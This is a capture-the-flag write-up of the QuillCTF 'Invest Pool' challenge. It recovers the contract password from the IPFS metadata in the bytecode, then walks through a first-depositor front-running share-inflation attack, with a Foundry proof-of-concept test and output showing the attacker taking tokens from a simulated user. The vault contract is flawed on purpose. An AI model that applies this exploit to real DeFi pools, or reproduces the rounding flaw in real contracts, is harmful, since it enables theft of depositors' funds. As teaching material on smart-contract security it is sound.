# QuillCTF : Invest Pool

## Objective of CTF

Your objective is to have a greater token balance than your initial balance.

### Contract code
```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract InvestPool {
    IERC20 token;
    uint totalShares;
    bool initialized;
    mapping(address => uint) public balance;

    modifier onlyInitializing() {
        require(initialized, "Not initialized! You are so stupid!");
        _;
    }

    constructor(address _token) {
        token = IERC20(_token);
    }

    function initialize(string memory password) external {
        // Password could be found in Goerli contract
        // 0xA45aC53E355161f33fB00d3c9485C77be3c808ae
        // Hint: Password length is more than 30 chars
        require(!initialized, "Already initialized");
        require(
            keccak256(abi.encode(password)) ==
                0x18617c163efe81229b8520efdba6384eb5c6d504047da674138c760e54c4e1fd,
            "Wrong password"
        );
        initialized = true;
    }

    function deposit(uint amount) external onlyInitializing {
        uint userShares = tokenToShares(amount);
        balance[msg.sender] += userShares;
        totalShares += userShares;
        token.transferFrom(msg.sender, address(this), amount);
    }

    function tokenToShares(uint userAmount) public view returns (uint) {
        uint tokenBalance = token.balanceOf(address(this));
        if (tokenBalance == 0) return userAmount;
        return (userAmount * totalShares) / tokenBalance;
    }

    function sharesToToken(uint amount) public view returns (uint) {
        uint tokenBalance = token.balanceOf(address(this));
        return (amount * tokenBalance) / totalShares;
    }

    function transferFromShare(uint amount, address from) public {
        uint size;
        assembly {
            size := extcodesize(address())
        }
        require(size == 0, "code size is not 0");
        require(balance[from] >= amount, "amount is too big");
        balance[from] -= amount;
        balance[msg.sender] += amount;
    }

    function withdrawAll() external onlyInitializing {
        uint shares = balance[msg.sender];
        uint toWithdraw = sharesToToken(shares);
        balance[msg.sender] = 0;
        totalShares -= shares;
        token.transfer(msg.sender, toWithdraw);
    }
}
```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";

contract PoolToken is ERC20("loan token", "lnt"), Ownable {
    function mint(uint amount) external onlyOwner {
        _mint(msg.sender, amount);
    }
}
```

### Foundry setup
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

import "forge-std/Test.sol";
import "../src/poolToken.sol";
import "../src/investPool.sol";

contract Hack is Test {
    PoolToken token;
    InvestPool pool;
    address user = vm.addr(1);
    address hacker = vm.addr(2);

    function setUp() external {
        token = new PoolToken();
        pool = new InvestPool(address(token));

        token.mint(2000e18);
        token.transfer(user, 1000e18);
        token.transfer(hacker, 1000e18);

        vm.prank(user);
        token.approve(address(pool), type(uint).max);

        vm.prank(hacker);
        token.approve(address(pool), type(uint).max);
    }

    function userDeposit(uint amount) public {
        vm.prank(user);
        pool.deposit(amount);
        vm.stopPrank();
    }

    function test_hack() public {
        uint hackerBalanceBeforeHack = token.balanceOf(hacker);
				vm.startPrank(hacker);

        // solution

				vm.stopPrank();
        assertGt(token.balanceOf(hacker), hackerBalanceBeforeHack);
    }
}
```

The `deposit()` and `withdrawAll()` has the `onlyInitializing` modifier, so we have to initialize the contract first

```solidity
    function initialize(string memory password) external {
        // Password could be found in Goerli contract
        // 0xA45aC53E355161f33fB00d3c9485C77be3c808ae
        // Hint: Password length is more than 30 chars
        require(!initialized, "Already initialized");
        require(
            keccak256(abi.encode(password)) ==
                0x18617c163efe81229b8520efdba6384eb5c6d504047da674138c760e54c4e1fd,
            "Wrong password"
        );
        initialized = true;
    }
```

I searched so long for the password, but I found nothing, that contract in solidity has a `getPassword()` function, but it just SLOAD the 2nd storage slot and it's not the password at all

I even tried to hash the contract address/transaction hash or combine other information to hash them, but still couldn't get the hash required

Then I try to get the metadata from the bytecode of the contract

### Bytecode :
```
0x6080604052348015600f57600080fd5b5060043610603c5760003560e01c80630dbe671f1460415780634df7e3d014605b578063cc8e2394146075575b600080fd5b6047608f565b6040516052919060b8565b60405180910390f35b60616095565b604051606c919060b8565b60405180910390f35b607b609b565b6040516086919060b8565b60405180910390f35b60005481565b60015481565b60025481565b6000819050919050565b60b28160a1565b82525050565b600060208201905060cb600083018460ab565b9291505056fea264697066735822122054c3e28cded5e23f5b3ee244c86c623b672d772b268fdc5e76e4fe131e690bea64736f6c634300060b0033
```

https://docs.soliditylang.org/en/v0.8.19/metadata.html

According to the docs, it is starting with 0xa264

```
0xa2
0x64 'i' 'p' 'f' 's' 0x58 0x22 <34 bytes IPFS hash>
0x64 's' 'o' 'l' 'c' 0x43 <3 byte version encoding>
0x00 0x33
```

So this is the metadata for the contract :
```
a264697066735822122054c3e28cded5e23f5b3ee244c86c623b672d772b268fdc5e76e4fe131e690bea64736f6c634300060b0033
```

```
a2 64 69706673 58 22 122054c3e28cded5e23f5b3ee244c86c623b672d772b268fdc5e76e4fe131e690bea 64736f6c6343 00060b 0033
```

So `122054c3e28cded5e23f5b3ee244c86c623b672d772b268fdc5e76e4fe131e690bea` is the 34 bytes ipfs hash and `00060b` is the solc version

There is no password in the metadata, then I tried to see if the ipfs hash contains anything

https://developers.cloudflare.com/web3/ipfs-gateway/concepts/ipfs/#content-identifiers

We have to encode that hex data to base58
```
>>> base58.b58encode(bytes.fromhex("122054c3e28cded5e23f5b3ee244c86c623b672d772b268fdc5e76e4fe131e690bea"))
b'QmU3YCRfRZ1bxDNnxB4LVNCUWLs26wVaqPoQSQ6RH2u86V'
```

Then I used ipfs.io to view it :
https://ipfs.io/ipfs/QmU3YCRfRZ1bxDNnxB4LVNCUWLs26wVaqPoQSQ6RH2u86V

It shows this :
```
j5kvj49djym590dcjbm7034uv09jih094gjcmjg90cjm58bnginxxx
```

Then I tried to hash it, and indeed this is the password :
```
 »  keccak256(abi.encode("j5kvj49djym590dcjbm7034uv09jih094gjcmjg90cjm58bnginxxx"))
0x18617c163efe81229b8520efdba6384eb5c6d504047da674138c760e54c4e1fd
```

So we can initialize the contract with that

Then in order get a greater balance, the invest pool contract is vulnerable to the first pool depositor front running issue

More details in this tweet :
https://twitter.com/bytes032/status/1634489196885819392

we can call `userDeposit()` to simulate a user depositing to the contract, then front run it and deposit 1 wei, and sending token of half of the amount of the user's deposit to the invest pool contract without the deposit function

Then when user deposit, they will only get 1 share same amount as us, as we send half of the token and depositing 1 wei, so in this line of `tokenToShares()` :
```
(userAmount * totalShares) / tokenBalance
```

userAmount is the amount of the user's deposit, for example it's 1000 ether, then we front run it and deposit 1 wei, and transfer 500 ether of token without `deposit()` so there won't be any share for the 500 ether

But when the user deposit 1000 ether, it will be 
```
1000 ether * 1 / (500 ether + 1)
```

Because of the 1 wei we deposit, the shares the user get will be rounded down to 1 share, same as the amount we get

Then the pool will have `1500 ether + 1` as the token balance, and there are 2 shares in total, one for us, another one for the user, we has 50% of the total shares so we can withdraw half of the pool's token which is rounded down to 750 ether:
```
 »  uint(1500000000000000000001)/2
750000000000000000000
```

We sent and deposited `500 ether + 1 wei` to the contract in total, and we can withdraw 750 ether at the end, so we earned `250 ether - 1 wei`

## Proof of concept

### Foundry test

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

import "forge-std/Test.sol";
import "../src/poolToken.sol";
import "../src/investPool.sol";

contract Hack is Test {
    PoolToken token;
    InvestPool pool;
    address user = vm.addr(1);
    address hacker = vm.addr(2);

    function setUp() external {
        token = new PoolToken();
        pool = new InvestPool(address(token));

        token.mint(2000e18);
        token.transfer(user, 1000e18);
        token.transfer(hacker, 1000e18);

        vm.prank(user);
        token.approve(address(pool), type(uint).max);

        vm.prank(hacker);
        token.approve(address(pool), type(uint).max);
    }

    function userDeposit(uint amount) public {
        vm.prank(user);
        pool.deposit(amount);
        vm.stopPrank();
    }

    function test_hack() public {
        uint hackerBalanceBeforeHack = token.balanceOf(hacker);
				vm.startPrank(hacker);

        // solution
        pool.initialize("j5kvj49djym590dcjbm7034uv09jih094gjcmjg90cjm58bnginxxx");
        
        // front running user's deposit
        pool.deposit(1);
        token.transfer(address(pool), 500e18);
        
        // simulating user depositing as the first depositor
        vm.stopPrank();
        userDeposit(1000e18);
        vm.startPrank(hacker);
        
        console.log("Hacker pool share balance :", pool.balance(hacker));
        console.log("User pool share balance :", pool.balance(user));
        console.log("investPool token balance :",token.balanceOf(address(pool)));

        pool.withdrawAll();
        
        console.log();
        console.log("Hacker pool share balance :", pool.balance(hacker));
        console.log("User pool share balance :", pool.balance(user));
        console.log("investPool token balance :",token.balanceOf(address(pool)));
        console.log("Hacker token balance :", token.balanceOf(hacker));
        
				vm.stopPrank();
        assertGt(token.balanceOf(hacker), hackerBalanceBeforeHack);
    }
}
```

### Foundry test output

```
# forge test --match-path test/investPool.t.sol -vv
[⠒] Compiling...
No files changed, compilation skipped

Running 1 test for test/investPool.t.sol:Hack
[PASS] test_hack() (gas: 165281)
Logs:
  Hacker pool share balance : 1
  User pool share balance : 1
  investPool token balance : 1500000000000000000001
  
  Hacker pool share balance : 0
  User pool share balance : 1
  investPool token balance : 750000000000000000001
  Hacker token balance : 1249999999999999999999

Test result: ok. 1 passed; 0 failed; finished in 2.19ms
```